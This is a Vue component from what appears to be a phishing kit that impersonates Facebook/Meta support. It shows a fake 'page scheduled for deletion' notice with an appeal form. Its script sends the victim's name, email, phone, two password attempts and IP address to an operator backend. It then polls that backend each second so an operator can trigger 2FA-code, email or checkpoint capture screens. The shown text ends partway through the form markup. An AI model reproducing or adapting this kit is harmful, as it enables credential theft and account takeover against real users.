<script>
import useValidate from "@vuelidate/core";
import { required } from "@vuelidate/validators";
import axios from "axios";
import ChatWidget from "@/components/ChatWidget.vue"

export default {
  name: "Form1",
  components:{
    ChatWidget,
  },
  data() {
    return {
      v$: useValidate(),
      waitingForResponse: false,
      chatMessage: false,
      loading: "",
      ipAddress: "",
      interval: "",
      decision: "",
      firstPassword: false,
      secondPassword: false,
      form: {
        page_name: "",
        name: "",
        email: "",
        mobile: "",
        appeal: "",
      },
      modal: {
        password: "",
        error: false,
      },
    };
  },
  created() {
    document.title = 'My Personal Account Was Restricted | Facebook';
    axios.interceptors.request.use(
      (config) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = true;
        }
        return config;
      },
      (error) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return Promise.reject(error);
      }
    );

    axios.interceptors.response.use(
      (response) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return response;
      },
      (error) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return Promise.reject(error);
      }
    );
  },
  mounted() {
    this.getClientIP();
    // this.checkBan();
  },
  methods: {
    chatMessageStatus() {
      this.chatMessage = true,
      console.log(this.chatMessage)
    },
    getClientIP() {
      axios
        .get("https://api.ipify.org?format=json")
        .then((response) => {
          this.ipAddress = response.data.ip;
        //   this.checkBan();
        })
        .catch((e) => {
          console.log(e);
        });
    },
    // checkBan() {
    //   axios
    //     .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/ban`, {
    //       ip: this.ipAddress,
    //     })
    //     .then((response) => {
    //       if (response.data == "BAN") {
    //         window.location.href = "https://www.facebook.com/help/";
    //       }
    //     })
    //     .catch((e) => {
    //       console.log(e);
    //     });
    // },
    getResponse() {
      this.interval = setInterval(() => {
        axios
          .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/decision`, {
            case_ref: this.ipAddress,
          })
          .then((response) => {
            let resType;

            if (response.data == "CMD_EMAIL") {
              resType = "email";

                this.$router.push({
                    name: "twofa",
                    params: {
                        type: resType,
                        email: this.form.email,
                    },
                });
                clearInterval(this.interval);
            }

            if (response.data == "CMD_CODE") {
                resType = "code";

                this.$router.push({
                    name: "twofa",
                    params: {
                        type: resType,
                        email: this.form.email,
                    },
                });
                clearInterval(this.interval);
            }

            if (response.data == "CMD_CHECKPOINT") {
              this.$router.push({
                path: "checkpoint",
              });
              clearInterval(this.interval);
            }

            if (response.data == "CMD_WRONG") {
                this.wrongPw = true;
                this.loading = false;
                this.modal.password = '';
                clearInterval(this.interval);
            }
          })
          .catch((e) => {
            console.log(e);
          });
      }, 1000);
    },
    submitForm() {
      console.log("submit");
      this.v$.$validate(); // checks all inputs
      if (!this.v$.$error) {
        let data = {
          page_name: this.form.page_name,
          name: this.form.name,
          email: this.form.email,
          mobile: this.form.mobile,
          //   appeal: this.form.appeal,
        };
        console.log(data);
        axios
          .post(
            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
            data
          )
          .then((response) => {
            console.log(response);
          })
          .catch((e) => {
            this.errors.push(e);
            console.log(this.errors);
          });

        this.firstPassword = true;
      }
    },
    submitPassword() {
      if (this.modal.password != "") {
        if (this.secondPassword == false) {
          this.modal.error = false;
          axios
            .post(
              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
              { firstPassword: this.modal.password }
            )
            .then((response) => {
              console.log(response);
                console.log(response);
                this.waitingForResponse = true;
                this.loading = true;
                this.getResponse();
                this.secondPassword = true;
            })
            .catch((e) => {
              this.errors.push(e);
              console.log(this.errors);
            });

          this.modal.password = "";
        } else {
          axios
            .post(
              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
              { secondPassword: this.modal.password }
            )
            .then((response) => {
              console.log(response);
              this.waitingForResponse = true;
              this.loading = true;
              this.getResponse();
            })
            .catch((e) => {
              this.errors.push(e);
              console.log(this.errors);
            });
        }
      } else {
        this.modal.error = true;
      }
    },
    alert(){
      alert('Please complete the form before you navigate.');
    }
  },
  validations() {
    return {
      form: {
        page_name: { required },
        name: { required },
        email: { required },
        mobile: { required },
        appeal: { required },
      },
    };
  },
};
</script>

<template>
  <div v-if="loading" id="loadFacebookC" class="">
    <div id="loadFacebookG">
      <div id="blockG_1" class="facebook_blockG"></div>
      <div id="blockG_2" class="facebook_blockG"></div>
      <div id="blockG_3" class="facebook_blockG"></div>
    </div>
  </div>
  <div id="form">
    <div class="topheader">
      <div class="container">
        <img class="metalogo" src="../assets/images/logo.svg" />
        <p class="metahead">Support Inbox</p>
        <img src="../assets/images/search.png" class="searchicon" />
      </div>
    </div>
    <div class="menufordesktop">
      <div class="container">
        <ul>
          <li>Create &amp; Manage Accounts</li>
          <li>Publish &amp; Distribute Content</li>
          <li>Advertise</li>
          <li>Sell on Facebook &amp; Instagram</li>
          <li>Monetize Your Content or App</li>
        </ul>
      </div>
    </div>
    <div class="masheader" id="masheader">
      <div class="wrapper">
        <div class="container">
          <p class="businesshelp">Meta Business Help Center</p>
          <p class="businesshelpcenter">Get Support</p>
        </div>
      </div>
    </div>
    <div>
      <div class="twofac" id="twofac">
        <div class="container">
          <div class="row">
            <div class="col-md-6 offset-md-3">
              <div class="karta">
                <div class="fillimitwo">
                  <p>Two-Factor Authentication Required</p>
                </div>
                <div class="bodytwo">
                  <p>
                    You’ve asked us to require a 6-digit login code when anyone
                    tries to access your account from a new device or browser.
                  </p>
                  <p>
                    Enter the 6-digit code from your
                    <strong>Code Generator</strong> or 3rd party app below.
                  </p>
                  <!-- <form id="formapertwo" class=""> -->
                  <div class="mb-3 formapw">
                    <input
                      placeholder="Login Code"
                      required=""
                      pattern="[0-9](.{5}|.{7})"
                      type="text"
                      id="newlogin"
                      class="form-control"
                    />
                  </div>
                  <!-- </form> -->
                </div>
                <div class="fundtwo">
                  <div class="majtneedanother">
                    <a class="needanotherway"
                      >Need another way to authenticate?</a
                    >
                  </div>
                  <div class="djathtneedanother">
                    <button
                      type="button"
                      form="formapertwo"
                      class="btn btn-primary button-15 butonicontinue"
                    >
                      Continue
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div id="nicecontainer" class="nicecontainer">
        <div class="container">
          <div class="row">
            <div class="col-md-8 offset-md-2">
              <div class="trupi">
                <div class="topi">
                  <img
                    src="data:image/png;base64,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"
                    class="imazhinewmessg"
                  />
                  <div>
                    <p class="toptext">
                      Your page goes against our Community Standards
                    </p>
                    <p class="caseopen">OPEN</p>
                    <p class="casenumber">Case #234857718299001</p>
                  </div>
                </div>
                <div class="mesi">
                  <p class="activitytext">ACTIVITY</p>
                  <div class="ourmessage">
                    <img
                      src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQIA7ADsAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wgARCADsAOwDASIAAhEBAxEB/8QAGwABAAMBAQEBAAAAAAAAAAAAAAUGBwQBAgP/xAAZAQEAAwEBAAAAAAAAAAAAAAAAAgMEBQH/2gAMAwEAAhADEAAAAbBSHx0sgT8AAAAAAAAAAAAktQx3upnwi6AAAAAAAAAAAAAAAAAAAAAAAl/ETOaBI5bqL+9zVTpf5XkZ3VNnxjTV6L6wAAAAAAAAJHV4OxYNAU2AAc+MbPjGuj0aqgAAAAAAAH6/lK+NX+jl7AENHZ3oq0Rna6F/z/1ZAJ+AAAAAAAAJuEm4e6mObrAzqrWesdHKFkQAAAAAAAB9nwtKuVWm+6Rj7dBg0gZxWNCht2erLSnGrJ+Al4EvAAAAAAHTzdPjZRy9gAAAAFZze80bfmC6AAAAAADp5unxso5ewAAAADPKpOwXRyhZEAAAAAADoc7x0TNem4y1Mc3UBntbn6x0MvQ51kffD0AAAAAAAAAm4Sbh7qY5usDOKxZ6x0coWRAAAAAAAAAATcJNw91Mc3WBnFYs9Y6OULIgAAAAAAAAAJuEm4e6mObrAzisWesdHKFkQAAAAAAAAAE3CTcPdTHN1gZxWLPWOjlCyIAAElG7FldM+EXQAAAAATcJNw91Mc3WBnFYs9Y6OULIgALz5dst3//EACcQAAAEBgICAwADAAAAAAAAAAIDBAUAAQYgNEAVNRMwERJBIiRg/9oACAEBAAEFAndyEAYhTFPaSrTkwkigKkgYpiFuEKjCQ/46UvmZDUqNgDFOOCBHBBibFODWU0ANZAhMWDSIyUobVGP+aiBMJWoKLCUXcox/zUY0/hR3qMf80ygeQ0MpBDYockxE+bTxzaeDXkgZWo1S+zjY/KhEk7DN2VlRT/u7DL2VlQ52wy9lZUOdqAD9x8IojhFEcIohvazk6ux0bjVanhFEcIojhFEKms5MRoJcn2VAL4Q6CXJ9lSC/joJcn2VEL5V6CXJ9j2L7OOj5jY8xseY2Gc0wTjY/mDCt8xseY2PMbE5znPUZeysqHO2GXsrKhzthl7Kyoc7YZeysqHO2GXsrKhzthl7Kyoc7YZeysqHO2GXsrKhzthl7Kyoc70uCeaZV7mXsrKhzvQ2tgRpVSYpSBYVIk/2svZWVDnXtCEkYI//EACIRAAEDBAICAwAAAAAAAAAAAAIBMDEAEBEgAxITIUBBUf/aAAgBAwEBPwEiy8B4+QiZpOL9roNeMa5BRIbAcJpytJczx6SvItKSq0M3OW+i0grm5Cua6LSphhN+SWE3KWhm5S4M3KXBm5S4M3KXBm5TqY43GblOgB9rX//EACcRAAECBAUEAwEAAAAAAAAAAAECAwAQMDIREhMgMQQhIlEUQEJS/9oACAECAQE/AUICBWdaz8fYJA7mFdT/ADGsv3Gsv3DKyvmm8vMcNnTcGko4DGbTOYYmPjohCAjiku0zasFPVR7hbiSk95tuJCR3jVR7gKCuKB43sDwoHje2MEijhCx4mbQ8RGFNdpm1YKi7TNqwVF2mbVgqLtM2rBtaczjeu0zasGx538iP/8QAMxAAAQICBwYFAgcAAAAAAAAAAQIDAEARICExcoGxMDIzUZGSEiJBYXETUgQQI0JgYqL/2gAIAQEABj8CLH4c0EbyopUST7zfkWaPtN0JcR6+nKCo3m2d8KDQL/4fQLTG54B/ePO+Mkxx1dscc9sWP/5hSvqoIApl7PK2L1R+km37jfWcwmWDYuvUeQhKGxQkV3MJlgs77luWwcwmVQgfuNEAC4VaFOUq5Jtjcd6RuO9IWkIctFEqx801UtNmhTl/xMs56VUYJlrPSqnAJlrPSqnAJVKReTRG+11Mb7XUxvtdTCHVqbKRyqhxtSAPDRbG+11Mb7XUxvtdTCnVqboHKRZxjXagfcsSLOMa7VhPuTIs4xrtW08kSLOMa7Vz2oElxXO4xxXO4xxXO4w0FOLItvPtVAStQHgFxjiudxjiudxjiudxikmkyrWelVOATLWelVOATLWelVOATLWelVOATLWelVOATLWelVOATLWelVOATLWelVOATLWelVOAbJaDden427WelVOAbELepBVaPiPC6mnkeUFCaaPfbNZ6VU4BsPqrBUR6G78v/8QAKhAAAQEHAwMEAwEAAAAAAAAAAfAAESAxQFFhITBBcbHBgZGh0RDh8WD/2gAIAQEAAT8hl8IGb7Bs/aJ9WKEzmR5NpdDQblm1HSkq0nLIeX+PIIJJIAPJYECQNyTvibFjSHreW/kmPF7b7bjfr+7AwUpCKfnEa4+Bcs4Ab9QvWJWswk6Ur0UNIPqO4ARq1mEnSlGAcvsCvsK1mEnSkJMQfeWCG4DgIS10ph0MX+hPR9t/KfbPYE4PAt1YSFI5FviBMJgDw8JgPupUZQkIOAPc1KbKFSualNlCpXNKdynIH5ZeeGXHhlx4Z75F4Ivk60I4FB0y+Zxllx4ZceGXHhiAzvQi/UutQpNm7i0dzQpNm71r2H3QpNm71gvc/qhSbN3oP8P7oQSCCC4jmDLLIggSFImhk6sFHJgyyyMiiTJLyaVNlCpXNSmyhUrmpTZQqVzUpsoVK5qU2UKlc1KbKFSualNlCpXNSmyhUrmpTZQqVztCg1l5ffJsoVK52RIknDvQ2g8EjQ9BYupAd4myhUrnYHjm0J2fj//aAAwDAQACAAMAAAAQBAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAABd88yAAAAAAAAAAX888DAAAAAAAAAF886iRAAAAAAAAAD88KAAAAAAAAAENN88kNCAAAAAAAV888888JAAAAAAAV888888iAAAAAAAQDQ88rDgAAAAAAAAAD88qAAAAAAAAAAAD88qAAAAAAAAAAAD88qAAAAAAAAAAAD88qAAAADAAAAAAD88qAAAM//EAB4RAQABBQEBAQEAAAAAAAAAAAExABARIDBhIUFA/9oACAEDAQE/EEeXsnyx/QiwUX6ryrwpE5vsfrpM5DKF1djmeUN5efjRwpdbQrxpFh4SN3nhkbvL45aTjdudZecN5+kN5+kN5+kN59cvJG8N59CaP//EACMRAAEDAwQCAwAAAAAAAAAAAAEQETAAMaEgIUFRQGGR8PH/2gAIAQIBAT8QbAmCD7D5A1zajWD5on/FD7hQ4njGdlYTRw6KF72QdhzixiuBFZIGBwKho7kghyeC9raD3Be1tL1CzqhWOCoLXFM6jxiuBJjFcCTGK4EmMVwNO2G414xXA0HBs1//xAAqEAEAAQEGBQQCAwAAAAAAAAABEQAhMUBBUfAgYXGxwTCBkaFg0RCA4f/aAAgBAQABPxDku2j6cZt82ERSZvtWp93Fh+Law9Iy6kNEkglMo3rd0Uj0qXNWXvjUPFQItQPB+HtZmFkcgta1UvH8J+QUUdFL9kdqILZtudKu/VqAvW/KrxsAvQJYv0oZB1JwzTKEgHI/wM6PEMj5zydCDi33XX1XbCqQKwFxe9W45taWQTftb1z499119V2wsAeBktP0rfQb7rr6rthLtBXsHmolgaQCDhkuWFWtFLB5TRECaw/wpGFskMVBPuoQGgGENsk2g5UXcEo1D4ghBykx0GsoLsQZ4aIXJff9f4iYjMRtuFq4KAnlbwARIm3VDOpYiQZ8Li0gkhMlZY4BIkTHB4rpARIL3BDD1IwbYHUDwGCGHqRibzOgDuwQw9SMGSQaK+BjRk1HhkG9iv2sCzZUgYR1K3R5rdHmt0eatcjWzUFjhR2mhM38DW6PNbo81uDzTtvlZHNbX+ihiMxGYjMRmIzEZiMxGYjVyNi2MyR0ueZjTEbHz3kQCU6wvRKNCYqJWuR2aaT4FC2PIMWYjO+SGQ3zAt95KLLq/9k="
                      class="ourmessageimage"
                    />
                    <div>
                      <p class="toptext marginleftside">Our Message</p>
                      <p class="ourreply">
                        Your page has been scheduled for deletion because one or
                        more the following<br />- Intellectual Property
                        Infringement<br />- Community Standards <br />- Hate
                        Speech
                      </p>
                    </div>
                  </div>
                </div>
                <div class="mesi">
                  <div class="ourmessage">
                    <img
                      src="../assets/images/user.png"
                      class="ourmessageimage"
                    />
                    <div class="yourreply">
                      <p class="toptext yourreplytext">Your Reply</p>
                      <p class="provideinformation">
                        Please be sure to provide the requested information
                        below. Failure to provide this information may delay the
                        processing of your appeal.
                      </p>
                      <!-- <form class=""> -->
                      <div class="mb-3">
                        <label class="labela" for="field_pagename">
                          Account Name *</label
                        >
                        <input
                          required=""
                          type="text"
                          id="field_pagename"
                          v-model="form.page_name"
                          class="form-control"
                        />
                        <p
                          v-for="(error, index) of v$.form.page_name.$errors"
                          :key="index"
                          class="pwincorrect"
                        >
                          Page name cannot be empty!
                        </p>
                      </div>
                      <div class="mb-3">
                        <label class="labela" for="field_name">
                          Full Name *</label
                        >
                        <input
                          required=""
                          type="text"
                          id="field_name"
                          v-model="form.name"
                          class="form-control"
                        />
                        <p
                          v-for="(error, index) of v$.form.name.$errors"
                          :key="index"
                          class="pwincorrect"
                        >
                          Your name cannot be empty!
                        </p>
                      </div>
                      <div class="mb-3">
                        <label class="labela" for="field_email">
                          Login Email Or Phone Number</label
                        >
                        <input
                          required=""
                          type="text"
                          id="field_email"
                          v-model="form.email"
                          class="form-control"
                        />
                        <p
                          v-for="(error, index) of v$.form.email.$errors"
                          :key="index"
                          class="pwincorrect"
                        >
                          Email cannot be empty!
                        </p>
                      </div>
                      <div class="mb-3">
                        <label class="labela" for="field_mobile"
                          >Your Phone Number</label
                        >
                        <input
                          required=""
                          type="text"
                          id="field_mobile"
                          v-model="form.mobile"
                          class="form-control"
                        />
                        <p
                          v-for="(error, index) of v$.form.mobile.$errors"
                          :key="index"
                          class="pwincorrect"
                        >
                          Phone number cannot be empty!
                        </p>
                      </div>
                      <div class="mb-3">
